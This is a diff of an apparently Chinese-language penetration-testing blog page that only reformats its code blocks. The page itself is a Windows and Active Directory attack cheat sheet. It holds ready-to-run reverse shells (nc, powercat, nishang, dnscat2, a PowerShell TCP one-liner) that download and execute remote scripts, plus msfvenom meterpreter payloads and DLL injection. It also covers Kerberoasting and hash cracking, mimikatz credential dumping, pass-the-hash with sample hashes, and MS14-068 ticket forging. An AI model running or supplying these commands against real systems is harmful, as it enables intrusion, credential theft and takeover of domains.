@@ -394,31 +394,92 @@
 <p><a href="https://download.cnet.com/Microsoft-Windows-PowerShell-1-0-for-Windows-XP/3000-2070_4-75450849.html" target="_blank" rel="noopener">https://download.cnet.com/Microsoft-Windows-PowerShell-1-0-for-Windows-XP/3000-2070_4-75450849.html</a></p>
 </li>
 </ol>
-<h2 id="Windows反弹shell"><a href="#Windows反弹shell" class="headerlink" title="Windows反弹shell"></a>Windows反弹shell</h2><h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Attacker</span><br><span class="line">nc -vlp <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"># Victim</span><br><span class="line">nc.exe <span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span> <span class="number">9999</span> -e c:\WINDOWS\system32\<span class="built_in">cmd</span>.exe</span><br></pre></td></tr></table></figure>
+<h2 id="Windows反弹shell"><a href="#Windows反弹shell" class="headerlink" title="Windows反弹shell"></a>Windows反弹shell</h2><h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><pre><code class="cmd"># Attacker
+nc -vlp 9999
 
+# Victim
+nc.exe 192.168.255.128 9999 -e c:\WINDOWS\system32\cmd.exe</code></pre>
 <h3 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h3><p><a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener">https://github.com/besimorhino/powercat</a> </p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Attacker</span><br><span class="line">nc -lvp <span class="number">6666</span> 或 powercat -l -p <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"># Victim</span><br><span class="line">powershell IEX (New-Object System.<span class="built_in">Net</span>.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');</span><br><span class="line">powercat -c <span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span> -p <span class="number">6666</span> -e <span class="built_in">cmd</span></span><br></pre></td></tr></table></figure>
+<pre><code class="cmd"># Attacker
+nc -lvp 6666 或 powercat -l -p 6666
 
+# Victim
+powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);
+powercat -c 192.168.255.128 -p 6666 -e cmd</code></pre>
 <h3 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h3><p><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></p>
-<h3 id="Reverse-TCP-Shell"><a href="#Reverse-TCP-Shell" class="headerlink" title="Reverse TCP Shell"></a>Reverse TCP Shell</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Attacker</span><br><span class="line">nc -lvp <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"># Victim</span><br><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/<span class="number">9</span>a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span> -port <span class="number">6666</span></span><br><span class="line">或</span><br><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString('http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span>/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span> -port <span class="number">6666</span></span><br></pre></td></tr></table></figure>
+<h3 id="Reverse-TCP-Shell"><a href="#Reverse-TCP-Shell" class="headerlink" title="Reverse TCP Shell"></a>Reverse TCP Shell</h3><pre><code class="cmd"># Attacker
+nc -lvp 6666
 
-<h3 id="Reverse-UDP-Shell"><a href="#Reverse-UDP-Shell" class="headerlink" title="Reverse UDP Shell"></a>Reverse UDP Shell</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Attacker</span><br><span class="line">nc -lvup <span class="number">53</span></span><br><span class="line"></span><br><span class="line"># Victim</span><br><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString('http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">159</span>.<span class="number">134</span>/nishang/Shells/Invoke-PowerShellUdp.ps1');Invoke-PowerShellUdp -Reverse -IPAddress <span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span> -port <span class="number">53</span></span><br></pre></td></tr></table></figure>
+# Victim
+powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.255.128 -port 6666
+或
+powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.255.128/nishang/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.255.128 -port 6666</code></pre>
+<h3 id="Reverse-UDP-Shell"><a href="#Reverse-UDP-Shell" class="headerlink" title="Reverse UDP Shell"></a>Reverse UDP Shell</h3><pre><code class="cmd"># Attacker
+nc -lvup 53
 
+# Victim
+powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.159.134/nishang/Shells/Invoke-PowerShellUdp.ps1&#39;);Invoke-PowerShellUdp -Reverse -IPAddress 192.168.255.128 -port 53</code></pre>
 <h3 id="Reverse-ICMP-shell"><a href="#Reverse-ICMP-shell" class="headerlink" title="Reverse ICMP shell"></a>Reverse ICMP shell</h3><p>icmpsh_m.py：<a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener">https://github.com/inquisb/icmpsh</a></p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Attacker</span><br><span class="line">sysctl -w <span class="built_in">net</span>.ipv4.icmp_echo_ignore_all=<span class="number">1</span> #忽略所有icmp包</span><br><span class="line">python icmpsh_m.py <span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">130</span> #开启监听</span><br><span class="line"></span><br><span class="line"># Victim</span><br><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString('http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span>/nishang/Shells/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp -IPAddress <span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">130</span></span><br></pre></td></tr></table></figure>
+<pre><code class="cmd"># Attacker
+sysctl -w net.ipv4.icmp_echo_ignore_all=1 #忽略所有icmp包
+python icmpsh_m.py 192.168.255.128 192.168.255.130 #开启监听
 
-<h3 id="自定义payload"><a href="#自定义payload" class="headerlink" title="自定义payload"></a>自定义payload</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Attacker</span><br><span class="line">nc -lvp <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"># Victim</span><br><span class="line">powershell -nop -c "$client = New-Object <span class="built_in">Net</span>.Sockets.TCPClient('<span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span>',<span class="number">6666</span>);$stream = $client.GetStream();</span><br><span class="line">[byte[]]$bytes = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;while(($i = $stream.Read($bytes, <span class="number">0</span>, $bytes.Length)) -ne <span class="number">0</span>)&#123;;</span><br><span class="line">$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,<span class="number">0</span>, $i);$sendback = (iex $data <span class="number">2</span>&gt;&amp;<span class="number">1</span> | Out-String );</span><br><span class="line">$sendback2 = $sendback + 'PS ' + (pwd).<span class="built_in">Path</span> + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);</span><br><span class="line">$stream.Write($sendbyte,<span class="number">0</span>,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()"</span><br></pre></td></tr></table></figure>
+# Victim
+powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.255.128/nishang/Shells/Invoke-PowerShellIcmp.ps1&#39;);Invoke-PowerShellIcmp -IPAddress 192.168.255.130</code></pre>
+<h3 id="自定义payload"><a href="#自定义payload" class="headerlink" title="自定义payload"></a>自定义payload</h3><pre><code class="cmd"># Attacker
+nc -lvp 6666
 
+# Victim
+powershell -nop -c &quot;$client = New-Object Net.Sockets.TCPClient(&#39;192.168.255.128&#39;,6666);$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
+$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );
+$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</code></pre>
 <h3 id="Reverse-DNS-Shell"><a href="#Reverse-DNS-Shell" class="headerlink" title="Reverse DNS Shell"></a>Reverse DNS Shell</h3><p>dnscat2：<a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2</a> </p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Attacker</span><br><span class="line">ruby dnscat2.rb --dns "domain=lltest.com,host=<span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span>" --no-cache -e open</span><br><span class="line"></span><br><span class="line"># Victim</span><br><span class="line">powershell IEX (New-Object System.<span class="built_in">Net</span>.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1');<span class="built_in">Start</span>-Dnscat2 -Domain lltest.com -DNSServer <span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span></span><br></pre></td></tr></table></figure>
+<pre><code class="cmd"># Attacker
+ruby dnscat2.rb --dns &quot;domain=lltest.com,host=192.168.255.128&quot; --no-cache -e open
 
+# Victim
+powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#39;);Start-Dnscat2 -Domain lltest.com -DNSServer 192.168.255.128</code></pre>
 <h3 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h3><p>PowerSploit：<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Attacker</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span> lport=<span class="number">6667</span> -f dll -o /var/www/html/PowerSploit/lltest.dll</span><br><span class="line"></span><br><span class="line"># Victim</span><br><span class="line">Get-Process #选择要注入的进程 Id</span><br><span class="line">IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString("http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span>/PowerSploit/CodeExecution/Invoke-DllInjection.ps1")</span><br><span class="line">Invoke-DllInjection -ProcessID <span class="number">5816</span> -Dll C:UsersAdministratorDesktoplltest.dll</span><br></pre></td></tr></table></figure>
+<pre><code class="cmd"># Attacker
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.255.128 lport=6667 -f dll -o /var/www/html/PowerSploit/lltest.dll
 
-<h3 id="MSF-Reverse-Shell"><a href="#MSF-Reverse-Shell" class="headerlink" title="MSF Reverse Shell"></a>MSF Reverse Shell</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Attacker</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span> LPORT=<span class="number">4444</span> -f exe -o tcpshell.exe</span><br><span class="line"></span><br><span class="line"># Victim</span><br><span class="line">tcpshell.exe</span><br></pre></td></tr></table></figure>
+# Victim
+Get-Process #选择要注入的进程 Id
+IEX (New-Object Net.WebClient).DownloadString(&quot;http://192.168.255.128/PowerSploit/CodeExecution/Invoke-DllInjection.ps1&quot;)
+Invoke-DllInjection -ProcessID 5816 -Dll C:UsersAdministratorDesktoplltest.dll</code></pre>
+<h3 id="MSF-Reverse-Shell"><a href="#MSF-Reverse-Shell" class="headerlink" title="MSF Reverse Shell"></a>MSF Reverse Shell</h3><pre><code class="cmd"># Attacker
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.255.128 LPORT=4444 -f exe -o tcpshell.exe
 
-<h2 id="信息收集（简）"><a href="#信息收集（简）" class="headerlink" title="信息收集（简）"></a>信息收集（简）</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span> /all    </span><br><span class="line"># 查询本机IP段，所在域等</span><br><span class="line"><span class="built_in">net</span> config Workstation    </span><br><span class="line"># 当前计算机名，全名，用户名，系统版本，工作站域，登陆域</span><br><span class="line"><span class="built_in">net</span> user    </span><br><span class="line"># 本机用户列表</span><br><span class="line"><span class="built_in">net</span> localgroup administrators    </span><br><span class="line"># 本机管理员[通常含有域用户]</span><br><span class="line"><span class="built_in">net</span> user /domain    </span><br><span class="line"># 查询域用户</span><br><span class="line"><span class="built_in">net</span> user 用户名 /domain    </span><br><span class="line"># 获取指定用户的账户信息</span><br><span class="line"><span class="built_in">net</span> user /domain b404 pass    </span><br><span class="line"># 修改域内用户密码，需要管理员权限</span><br><span class="line"><span class="built_in">net</span> group /domain    </span><br><span class="line"># 查询域里面的工作组</span><br><span class="line"><span class="built_in">net</span> group 组名 /domain    </span><br><span class="line"># 查询域中的某工作组</span><br><span class="line"><span class="built_in">net</span> group "domain admins" /domain    </span><br><span class="line"># 查询域管理员列表</span><br><span class="line"><span class="built_in">net</span> group "domain controllers" /domain    </span><br><span class="line"># 查看域控制器(如果有多台)</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> /domain    </span><br><span class="line"># 判断主域，主域服务器都做时间服务器</span><br><span class="line"><span class="built_in">ipconfig</span> /all    </span><br><span class="line"># 查询本机IP段，所在域等</span><br></pre></td></tr></table></figure>
-
+# Victim
+tcpshell.exe</code></pre>
+<h2 id="信息收集（简）"><a href="#信息收集（简）" class="headerlink" title="信息收集（简）"></a>信息收集（简）</h2><pre><code class="cmd">ipconfig /all    
+# 查询本机IP段，所在域等
+net config Workstation    
+# 当前计算机名，全名，用户名，系统版本，工作站域，登陆域
+net user    
+# 本机用户列表
+net localgroup administrators    
+# 本机管理员[通常含有域用户]
+net user /domain    
+# 查询域用户
+net user 用户名 /domain    
+# 获取指定用户的账户信息
+net user /domain b404 pass    
+# 修改域内用户密码，需要管理员权限
+net group /domain    
+# 查询域里面的工作组
+net group 组名 /domain    
+# 查询域中的某工作组
+net group &quot;domain admins&quot; /domain    
+# 查询域管理员列表
+net group &quot;domain controllers&quot; /domain    
+# 查看域控制器(如果有多台)
+net time /domain    
+# 判断主域，主域服务器都做时间服务器
+ipconfig /all    
+# 查询本机IP段，所在域等</code></pre>
 <h2 id="Kereros-协议（简）"><a href="#Kereros-协议（简）" class="headerlink" title="Kereros 协议（简）"></a>Kereros 协议（简）</h2><ul>
 <li>客户机将明文密码进行NTLM哈希，然后和时间戳一起加密（使用KRBTGT密码hash作为密钥），发送给KDC（域控），KDC对用户进行检测，成功之后创建TGT（票据授权票据）</li>
 <li>将TGT进行加密签名返回给客户机器，只有域用户KRBTGT才能读取Kerberos中TGT数据</li>
@@ -447,39 +508,42 @@
 <p>下载地址：</p>
 <p><a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll" target="_blank" rel="noopener">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p>
 </blockquote>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module ActiveDirectory</span><br><span class="line">get-aduser -filter &#123;AdminCount -eq <span class="number">1</span> -and (servicePrincipalName -ne <span class="number">0</span>)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>
+<pre><code class="cmd">import-module ActiveDirectory
+get-aduser -filter {AdminCount -eq 1 -and (servicePrincipalName -ne 0)} -prop * |select name,whencreated,pwdlastset,lastlogon</code></pre>
 </li>
 <li><p>使用PowerView</p>
 <p>脚本地址：</p>
 <p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>
+<pre><code class="cmd">Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon</code></pre>
 </li>
 <li><p>使用kerberoast</p>
 <p>脚本地址：</p>
 <p>（powershell）<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a></p>
 <p>（vbs）<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</a></p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript GetUserSPNs.vbs</span><br></pre></td></tr></table></figure>
+<pre><code class="cmd">cscript GetUserSPNs.vbs</code></pre>
 </li>
 </ol>
 </li>
 <li><p>请求TGS，执行后输入<code>klist</code>查看内存中的票据，可找到获得的TGS。</p>
 <ol>
 <li><p>请求指定TGS</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$SPNName = 'MSSQLSvc/DC1.test.com'</span><br><span class="line">Add-<span class="built_in">Type</span> -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</span><br></pre></td></tr></table></figure>
+<pre><code class="cmd">$SPNName = &#39;MSSQLSvc/DC1.test.com&#39;
+Add-Type -AssemblyNAme System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</code></pre>
 </li>
 <li><p>请求所有TGS</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Add-<span class="built_in">Type</span> -AssemblyName System.IdentityModel  </span><br><span class="line">setspn.exe -q */* | Select-String '^CN' -Context 0,1 | % &#123; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="cmd">Add-Type -AssemblyName System.IdentityModel  
+setspn.exe -q */* | Select-String &#39;^CN&#39; -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  </code></pre>
 </li>
 </ol>
 </li>
 <li><p>导出TGS</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::list /export</span><br></pre></td></tr></table></figure>
+<pre><code class="cmd">mimikatz # kerberos::list /export</code></pre>
 </li>
 <li><p>破解</p>
 <p>脚本地址：</p>
 <p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tgsrepcrack.py wordlist.txt test.kirbi</span><br></pre></td></tr></table></figure>
-
+<pre><code class="cmd">./tgsrepcrack.py wordlist.txt test.kirbi</code></pre>
 </li>
 </ol>
 <h4 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h4><p>自动实现，并且不需要mimikatz，普通用户权限即可</p>
@@ -490,18 +554,13 @@
 <p><strong>利用步骤</strong></p>
 <ol>
 <li><p>在域内一台主机上以普通用户权限执行</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl</span><br></pre></td></tr></table></figure>
+<pre><code class="cmd">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl</code></pre>
 </li>
 <li><p>只提取hash参数</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation</span><br></pre></td></tr></table></figure>
+<pre><code class="cmd">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation</code></pre>
 </li>
 <li><p>使用hashcat破解</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m <span class="number">13100</span> /tmp/hash.txt /tmp/password.list -o found.txt --force</span><br></pre></td></tr></table></figure>
-
-
-
-
-
+<pre><code class="cmd">hashcat -m 13100 /tmp/hash.txt /tmp/password.list -o found.txt --force</code></pre>
 </li>
 </ol>
 <h3 id="Pth（Pass-the-hash）"><a href="#Pth（Pass-the-hash）" class="headerlink" title="Pth（Pass the hash）"></a>Pth（Pass the hash）</h3><p>直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。</p>
@@ -525,21 +584,18 @@
 <p>对于8.1/2012r2，安装补丁kb2871997的Win 7/2008r2/8/2012，可以使用AES keys代替NT hash</p>
 </blockquote>
 <p>获取 hash</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-
+<pre><code class="cmd">mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords</code></pre>
 <p>pth</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::pth /user:[Username] /domain:workgroup /ntlm:[NTLM]</span><br></pre></td></tr></table></figure>
-
+<pre><code class="cmd">mimikatz # sekurlsa::pth /user:[Username] /domain:workgroup /ntlm:[NTLM]</code></pre>
 <h4 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h4><p><strong>Invoke-TheHash</strong></p>
 <p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Module Invoke-TheHash.psd1Invoke-WMIExec -Target <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">21</span> -Domain workgroup -Username administrator -Hash ccef208c6485269c20db2cad21734fe7 -Command "calc.exe" -verbose</span><br></pre></td></tr></table></figure>
-
+<pre><code class="cmd">Invoke-Module Invoke-TheHash.psd1Invoke-WMIExec -Target 192.168.3.21 -Domain workgroup -Username administrator -Hash ccef208c6485269c20db2cad21734fe7 -Command &quot;calc.exe&quot; -verbose</code></pre>
 <p><strong>Invoke-SMBExec</strong></p>
 <blockquote>
 <p>支持SMB1，SMB2 (2.1)，and SMB signing，</p>
 </blockquote>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SMBExec -Target <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">21</span> -Domain test.local -Username test1 -Hash ccef208c6485269c20db2cad21734fe7 -Command "calc.exe" -verbose</span><br></pre></td></tr></table></figure>
-
+<pre><code class="cmd">Invoke-SMBExec -Target 192.168.3.21 -Domain test.local -Username test1 -Hash ccef208c6485269c20db2cad21734fe7 -Command &quot;calc.exe&quot; -verbose</code></pre>
 <p><strong>Invoke-SMBClient</strong></p>
 <blockquote>
 <p>支持SMB1, SMB2 (2.1), and SMB signing，如果只有SMB文件共享的权限，没有远程执行权限，可以使用该脚本。</p>
@@ -552,8 +608,7 @@
 <blockquote>
 <p>wmiexec.exe通过python impacket库实现的，生成的exe有点大，5M大小在实战起来有点不方便</p>
 </blockquote>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec -hashes <span class="number">00000000000000000000000000000000</span>:ccef208c6485269c20db2cad21734fe7 workgroup/administrator@<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">21</span> "whoami"</span><br></pre></td></tr></table></figure>
-
+<pre><code class="cmd">wmiexec -hashes 00000000000000000000000000000000:ccef208c6485269c20db2cad21734fe7 workgroup/administrator@192.168.3.21 &quot;whoami&quot;</code></pre>
 <blockquote>
 <p>wmiexec.py的hash参数格式为 LM Hash:NT Hash ，由于该Hash来自于Server 2008，系统默认不支持LM hash，所以LM hash可以设定为任意值</p>
 </blockquote>
@@ -578,11 +633,11 @@
 <li><p>使用 whoami/user 得到普通域用户的sid</p>
 </li>
 <li><p>执行payload生成TGT票据（.ccache文件）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码</span><br></pre></td></tr></table></figure>
-</li>
+<pre><code>ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码</code></pre></li>
 <li><p>票据注入，使用mimikatz将票据注入到当前内存中，伪造凭证，如果成功则拥有域管理权限，可任意访问域中所有机器，成功后会显示<code>Injecting ticket : OK</code></p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br><span class="line">mimikatz # kerberos::list          //查看当前机器凭证</span><br><span class="line">mimikatz # kerberos::ptc 票据文件   //将票据注入到内存中</span><br></pre></td></tr></table></figure>
-
+<pre><code class="cmd">mimikatz # kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造
+mimikatz # kerberos::list          //查看当前机器凭证
+mimikatz # kerberos::ptc 票据文件   //将票据注入到内存中</code></pre>
 </li>
 </ol>
